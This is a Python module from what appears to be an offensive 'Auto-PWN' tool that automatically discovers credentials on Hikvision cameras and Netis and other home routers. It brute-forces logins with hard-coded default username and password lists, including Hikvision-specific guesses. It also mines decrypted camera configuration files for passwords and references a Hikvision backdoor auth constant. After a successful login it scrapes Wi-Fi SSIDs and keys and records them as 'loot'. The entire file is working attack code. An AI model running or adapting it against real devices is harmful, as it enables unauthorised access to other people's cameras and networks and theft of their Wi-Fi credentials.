"""Automatic credential discovery (Router Scan style)."""

from __future__ import annotations

import os
import re
from pathlib import Path

import requests
from requests.auth import HTTPDigestAuth

from engines.hikvision_snapshots import (
    find_isapi_base,
    fetch_device_info,
    hikvision_digest_auth,
    HIKVISION_BACKDOOR_AUTH,
)
from engines.loot_report import LootEntry
from engines.utils import get_target_dir, log

# Common combos used by Router Scan and similar tools
ROUTER_SCAN_USERS = ("admin", "root", "guest", "user", "support")
ROUTER_SCAN_PASSWORDS = (
    "admin", "12345", "123456", "12345678", "123456789", "password",
    "1234", "1234567890", "888888", "666666", "000000", "guest",
)

HIKVISION_EXTRA_PASSWORDS = (
    "12345678eh",  # Router Scan confirmed on App-webs cameras
    "12345678", "123456789", "12345", "1234567890",
    "hikvision", "admin123", "Admin123", "qwerty", "111111", "888888",
)


def _session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN/1.0"
    return s


def extract_strings_from_hikvision_config(config_data: bytes) -> list[str]:
    """Pull filtered password-like strings from configurationFile."""
    from engines.hikvision_decryptor import HikvisionDecryptor
    return HikvisionDecryptor.decrypt(config_data)


def validate_hikvision_login(host: str, username: str, password: str, port: int = 80) -> tuple[bool, str, str]:
    """Validate real device login (HTTP Digest + userCheck on port 80 first)."""
    if password == "11":
        return False, "", ""

    base = f"http://{host}" if port == 80 else f"http://{host}:{port}"
    session = _session()
    digest = hikvision_digest_auth(username, password)

    fast_checks = (
        f"{base}/ISAPI/Security/userCheck",
        f"{base}/ISAPI/System/deviceInfo",
    )
    for url in fast_checks:
        try:
            r = session.get(url, auth=digest, timeout=8)
            if r.status_code == 200:
                body = r.text.lower()
                if any(x in body for x in ("statusvalue>200", "deviceinfo", "devicetype", "ok")):
                    model = ""
                    dev = fetch_device_info(session, base, (username, password), 8.0)
                    if dev:
                        model = f"{dev.device_type} {dev.model}".strip()
                    return True, base, model
        except requests.RequestException:
            continue

    try:
        r = session.get(f"{base}/ISAPI/Security/userCheck", auth=(username, password), timeout=8)
        if r.status_code == 200 and "statusvalue" in r.text.lower():
            return True, base, ""
    except requests.RequestException:
        pass

    return False, "", ""


def validate_isapi_login(host: str, username: str, password: str, port: int = 80) -> tuple[bool, str, str]:
    """Return (ok, base_url, model) using ISAPI DeviceInfo."""
    auth = (username, password)
    base, _msg, _use_backdoor = find_isapi_base(host, auth, port_hint=port, https=False, timeout=10.0)
    if not base:
        return False, "", ""
    session = _session()
    dev = fetch_device_info(session, base, auth, 10.0)
    model = f"{dev.device_type} {dev.model}".strip() if dev else ""
    return True, base, model


def hunt_hikvision_credentials(
    ip: str,
    users: list[str],
    password_candidates: list[str],
    port: int = 80,
) -> LootEntry | None:
    """Try passwords — Router Scan list first, then config strings."""
    seen: set[str] = set()
    ordered: list[str] = []

    # Priority 1: Router Scan / known Hikvision passwords (fast, high hit rate)
    for pw in list(HIKVISION_EXTRA_PASSWORDS) + list(password_candidates):
        if pw and pw != "11" and pw not in seen:
            seen.add(pw)
            ordered.append(pw)

    # Priority 2: filtered config strings (skip heavy parse if file huge)
    config_path = os.path.join(get_target_dir(ip), "configurationFile")
    if os.path.isfile(config_path) and os.path.getsize(config_path) < 500_000:
        with open(config_path, "rb") as f:
            for candidate in extract_strings_from_hikvision_config(f.read())[:10]:
                if candidate not in seen and candidate != "11":
                    seen.add(candidate)
                    ordered.append(candidate)

    log(f"Auto-testing {len(ordered)} Hikvision password candidate(s)...", "INFO")
    for user in users or ["admin"]:
        for password in ordered:
            if password == "11":
                continue
            ok, _base, model = validate_hikvision_login(ip, user, password, port)
            if ok:
                log(f"REAL DEVICE PASSWORD: {user}:{password}", "PWN")
                return LootEntry(
                    ip=ip,
                    port=port,
                    device_type="HIKVISION",
                    model=model or "Hikvision Device",
                    username=user,
                    password=password,
                    auth_method="HTTP Digest validated (real login)",
                )
    return None


def _netis_login_url(base: str) -> str | None:
    """Detect Netis form login page."""
    session = _session()
    try:
        r = session.get(f"{base}/login.htm", timeout=8)
        text = r.text.lower()
        if r.status_code == 200 and "login.cgi" in text and (
            "netis" in text or "adsl router login" in text
        ):
            return f"{base}/login.cgi"
    except requests.RequestException:
        pass
    return None


def _validate_basic_auth(session: requests.Session, url: str, user: str, password: str) -> tuple[bool, str]:
    """Only accept HTTP Basic/Digest when the server actually challenges for auth."""
    try:
        probe = session.get(url, timeout=8)
        challenged = probe.status_code == 401 or any(
            k.lower() == "www-authenticate" for k in probe.headers
        )
        if not challenged:
            return False, ""

        r = session.get(url, auth=(user, password), timeout=8)
        if r.status_code != 200:
            return False, ""

        body = r.text.lower()
        if "login.cgi" in body or 'name="password"' in body[:4000]:
            return False, ""
        if any(x in body for x in ("logout", "sign out", "signout", "wireless", "wan", "dhcp")):
            return True, r.text
    except requests.RequestException:
        pass
    return False, ""


def validate_netis_login(base: str, username: str, password: str) -> bool:
    """Netis routers use POST login.cgi — success redirects to index.htm."""
    session = _session()
    try:
        r = session.post(
            f"{base}/login.cgi",
            data={
                "username": username,
                "password": password,
                "submit.htm?login.htm": "Send",
            },
            timeout=10,
        )
        body = r.text.lower()
        if "index.htm" in body and "error" not in body and "alert" not in body:
            return True
    except requests.RequestException:
        pass
    return False


def hunt_web_router_credentials(ip: str, port: int, device_type: str) -> LootEntry | None:
    """Web login brute like Router Scan — Basic auth + Netis form login."""
    schemes = ["http", "https"] if port == 443 else ["http"]
    for scheme in schemes:
        base = f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}"
        url = base

        netis_login = _netis_login_url(base)
        if netis_login:
            log("Netis form login detected — testing credentials...", "INFO")
            for user in ROUTER_SCAN_USERS:
                for password in ROUTER_SCAN_PASSWORDS:
                    if validate_netis_login(base, user, password):
                        session = _session()
                        session.post(
                            f"{base}/login.cgi",
                            data={
                                "username": user,
                                "password": password,
                                "submit.htm?login.htm": "Send",
                            },
                            timeout=10,
                        )
                        ssid, key = "", ""
                        for page in ("status.htm", "wan.htm", "wireless.htm", "wl_basic.htm"):
                            try:
                                r = session.get(f"{base}/{page}", timeout=8)
                                s, k = _extract_wireless_hints(r.text)
                                ssid = ssid or s
                                key = key or k
                            except requests.RequestException:
                                continue
                        log(f"VALID NETIS LOGIN: {user}:{password} on {url}", "PWN")
                        return LootEntry(
                            ip=ip,
                            port=port,
                            device_type=device_type or "NETIS",
                            model="Netis ADSL Modem Router",
                            username=user,
                            password=password,
                            auth_method="Netis form login (POST login.cgi)",
                            wireless_ssid=ssid,
                            wireless_key=key,
                        )

        session = _session()
        for user in ROUTER_SCAN_USERS:
            for password in ROUTER_SCAN_PASSWORDS:
                ok, html = _validate_basic_auth(session, url, user, password)
                if ok:
                    ssid, key = _extract_wireless_hints(html)
                    log(f"VALID WEB AUTH: {user}:{password} on {url}", "PWN")
                    return LootEntry(
                        ip=ip,
                        port=port,
                        device_type=device_type,
                        username=user,
                        password=password,
                        auth_method="HTTP Basic/Digest",
                        wireless_ssid=ssid,
                        wireless_key=key,
                    )
    return None


def _extract_wireless_hints(html: str) -> tuple[str, str]:
    ssid = ""
    key = ""
    ssid_match = re.search(r'ssid["\s:=]+([^\s"\'<>]{3,32})', html, re.I)
    if ssid_match:
        ssid = ssid_match.group(1)
    key_match = re.search(r'(?:wpa|wep|key|password)["\s:=]+([^\s"\'<>]{4,64})', html, re.I)
    if key_match:
        key = key_match.group(1)
    return ssid, key


def parse_ingram_results(ip: str) -> list[LootEntry]:
    """Read Ingram output folder for discovered camera credentials."""
    results: list[LootEntry] = []
    base = Path(get_target_dir(ip))
    for sub in ("ingram_output", "ingram_results"):
        out_dir = base / sub
        if not out_dir.is_dir():
            continue
        for path in out_dir.rglob("*"):
            if path.suffix.lower() not in (".txt", ".csv", ".log"):
                continue
            try:
                text = path.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue
            for match in re.finditer(r"(\d+\.\d+\.\d+\.\d+)[:\s]+(\S+):(\S+)", text):
                if match.group(1) != ip:
                    continue
                results.append(
                    LootEntry(
                        ip=ip,
                        port=80,
                        device_type="CAMERA",
                        username=match.group(2),
                        password=match.group(3),
                        auth_method="Ingram scan",
                    )
                )
    return results
